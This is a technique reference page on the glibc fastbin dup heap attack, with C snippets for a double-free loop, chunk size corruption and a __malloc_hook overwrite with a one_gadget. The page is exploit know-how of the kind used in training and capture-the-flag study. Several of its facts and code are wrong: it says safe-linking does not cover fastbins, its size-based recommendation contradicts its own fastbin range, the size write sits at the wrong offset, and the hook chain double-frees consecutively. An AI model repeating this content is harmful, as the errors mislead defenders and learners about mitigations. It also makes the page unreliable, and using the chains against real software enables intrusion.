---
title: "Fastbin Dup"
description: "Double-freeing a fastbin chunk to corrupt the fastbin linked list and achieve arbitrary allocation."
severity: high
prerequisites:
  - "Understanding of ptmalloc2 fastbins"
  - "Ability to trigger a double-free"
  - "Knowledge of chunk size constraints (0x20-0x80)"
affected:
  heap: true
  stack: false
  kernel: false
  userland: true
tags: ["fastbin", "ptmalloc", "double-free", "linux"]
---

Fastbin dup is a classic heap exploitation technique that abuses the singly-linked nature of fastbins. By double-freeing a chunk into a fastbin, we can create a loop in the linked list, allowing us to allocate the same chunk multiple times and control its metadata.

## Fastbin Basics

Fastbins are LIFO singly-linked lists for small chunks (0x20–0x80 bytes by default). Key properties:
- **No coalescing** — adjacent free fastbin chunks are never merged
- **Singly-linked** — only `fd` pointer, no `bk`
- **Minimal checks** — no safe-linking (even post-glibc 2.32)
- **Size validation** — checks that chunk size matches fastbin index

## The Attack

### Classic Fastbin Dup

```c
// 1. Allocate two chunks
void *a = malloc(0x40);
void *b = malloc(0x40);

// 2. Free a twice (double-free)
free(a);
free(b);  // Optional: free b to bypass some checks
free(a);  // Double-free a

// 3. Fastbin[0x40] now looks like: a -> b -> a (loop!)

// 4. Allocate and control a
void *c = malloc(0x40);  // c == a
// Overwrite c->fd with target address

// 5. Allocate b
void *d = malloc(0x40);  // d == b

// 6. Allocate target!
void *e = malloc(0x40);  // e == target_address
```

### With Size Field Corruption

A more powerful variant corrupts the size field of a fastbin chunk to move it to a different fastbin index:

```c
// 1. Allocate chunk
void *a = malloc(0x40);
free(a);

// 2. Reallocate and corrupt size to 0x60
void *b = malloc(0x40);  // b == a
*(size_t *)(b + 0x8) = 0x61;  // Corrupt size to 0x60
free(b);  // Goes to fastbin[0x60] instead of fastbin[0x40]

// 3. Now allocate 0x60 to get a chunk in fastbin[0x40]'s region
void *c = malloc(0x50);  // c overlaps with fastbin[0x40] area
```

## Fastbin Dup into Malloc Hook

A practical exploitation chain:

```c
// Target: __malloc_hook at 0x7f...aafc0
// Need a chunk size of 0x7f nearby

// 1. Double-free into fastbin
void *a = malloc(0x60);
free(a);
free(a);  // Double free

// 2. Reallocate and set fd to (hook - 0x10)
void *b = malloc(0x60);
*(size_t *)b = __malloc_hook - 0x10;

// 3. Clear fastbin
malloc(0x60);

// 4. Allocate hook!
void *hook = malloc(0x60);  // hook == __malloc_hook - 0x10
*(size_t *)(hook + 0x10) = one_gadget;

// 5. Trigger
malloc(1);  // Calls one_gadget
```

## Mitigations

| Mitigation | Effectiveness |
|-----------|--------------|
| **Double-free detection** (glibc 2.29+) | Detects freeing same address twice consecutively. Bypass: free intermediate chunk. |
| **Safe-linking** (glibc 2.32+) | Only applies to tcache, **not fastbins**! Fastbins remain vulnerable. |
| **Pointer encryption** | Prevents fastbin dup entirely if implemented. |
| **ASAN** | Catches the double-free at runtime. |

## When to Use Fastbin Dup vs Tcache Poisoning

| Scenario | Technique |
|----------|-----------|
| glibc 2.26–2.31 | Tcache poisoning (easier, more reliable) |
| glibc 2.32+ with heap leak | Tcache poisoning with safe-linking bypass |
| glibc 2.32+ without heap leak | Fastbin dup (safe-linking doesn't protect fastbins) |
| Chunk size > 0x408 (tcache limit) | Fastbin dup |
| Need specific chunk size for target | Fastbin dup with size corruption |

## References

- [shellphish/how2heap](https://github.com/shellphish/how2heap) — fastbin_dup.c, fastbin_dup_into_stack.c
- [Angel Boy's heap exploitation techniques](https://github.com/scwuaptx/HITCON-Training)
